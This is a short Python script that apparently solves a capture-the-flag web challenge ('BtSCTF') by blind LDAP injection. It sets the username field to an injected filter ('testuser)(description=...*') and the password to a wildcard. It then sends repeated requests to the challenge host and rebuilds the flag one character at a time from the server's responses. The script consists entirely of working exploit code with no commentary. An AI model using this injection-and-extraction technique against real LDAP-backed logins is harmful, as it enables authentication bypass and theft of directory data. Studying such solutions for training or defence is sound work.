import requests

def solution(host: str) -> str:
    flag = "BtSCTF{"
    CORRECT = "User Description: FAILED TO LOAD"
    template = "testuser)(description={}*"
    data = {
        "password": "*"
    }
    with requests.Session() as session:
        while flag[-1] != "}":
            for c in range(0x7d, 0x19, -1):
                if c == 0x2a:
                    continue
                data["username"] = template[:].format(flag + chr(c))
                response = session.post(host, data = data)
                if CORRECT in response.text:
                    flag += chr(c)
                    break
            else:
                break
    return flag

if __name__ == "__main__":
    host = "https://lightweight.chal.bts.wh.edu.pl/"
    print(solution(host))
    